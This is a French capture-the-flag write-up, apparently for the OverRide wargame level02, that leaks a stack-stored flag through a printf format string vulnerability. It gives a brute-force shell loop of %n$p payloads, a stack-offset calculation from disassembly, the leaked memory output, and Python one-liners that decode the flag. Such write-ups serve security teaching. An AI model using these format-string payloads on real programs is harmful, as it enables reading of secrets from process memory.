Level02

Le programme va ouvrir le flag avec opens pour le stocker dans une variable local.
Celui-ci nous demande une entree et va l'afficher avec printf, donc nous allons essayer d'afficher la valeur stocker dans la variable local qui stock le flag grace a printf.

On va utiliser les options suivantes de printf : 
- %p Pointeur (adresse mémoire)
- %x Entier non signé en hexadécimal (minuscules)

Etape suivant : trouver l'addresse ou est stocker le flag, que nous savons etre une string.
2 Solutions : # level02

## Analyse du programme
Le binaire ouvre le flag avec `open` et le stocke dans une variable locale.  
Ensuite, il lit une entrée utilisateur et l’affiche avec `printf`.  
On peut donc exploiter une **vulnérabilité de format string** pour afficher la valeur stockée dans cette variable locale contenant le flag.

---

## Options utiles de printf
- `%p` : affiche un pointeur (adresse mémoire)  
- `%x` : affiche un entier non signé en hexadécimal  

---

## Méthode pour retrouver le flag

### Étape 1 : identifier l’adresse
On sait que le flag est une **string** stockée sur la pile. Deux solutions :

**Solution 1 — brute force**  
1 - faire une boucle sur n variable jusqu'a trouver un format qui ressemble a une sting
```for(( i = 1; i < 100; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done```

**Solution 2 - analyse assembler**
  
```  &buffer_flag : 0x00000000004008e6 <+210>:   lea    -0xa0(%rbp),%rax```

[RBP - 0xa0]

Taille de la stack frame : ```0x0000000000400818 <+4>:     sub    $0x120,%rsp
[0x120] = 288 octets```

Distance dans la stack de l'arg = ```[RBP - 0xa0] - [RBP - 0x120] = 0x120 - 0xa0 = 0x80 bytes```

chaque argument fait 8 octets, donc :
0x80 / 8 = 16 slots

Le premier slot sur la pile est l'argument 6  (les 5 premiers etant reserve a RSI, RDX,RCX, R8, R9)

Index = 16 + 6 = 22.

```
level02@OverRide:~$ for((i = 22; i < 32; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done  
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
27 - 0xfeff00 does not have access!
28 - 0x383225202d203832 does not have access!
29 - 0x7024 does not have access!
30 - (nil) does not have access!
31 - (nil) does not have access!
```

on voit que les 5 premieres address match un format 
```
level02@OverRide:~$ python -c 'print "756e505234376848".decode("hex")[::-1]'
Hh74RPnu
level02@OverRide:~$ python -c 'print "45414a3561733951".decode("hex")[::-1]'
Q9sa5JAE
level02@OverRide:~$ python -c 'print "377a7143574e6758".decode("hex")[::-1]'
XgNWCqz7
level02@OverRide:~$ python -c 'print "354a35686e475873".decode("hex")[::-1]'
sXGnh5J5
level02@OverRide:~$ python -c 'print "48336750664b394d".decode("hex")[::-1]'
M9KfPg3H
level02@OverRide:~$ Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H: command not found```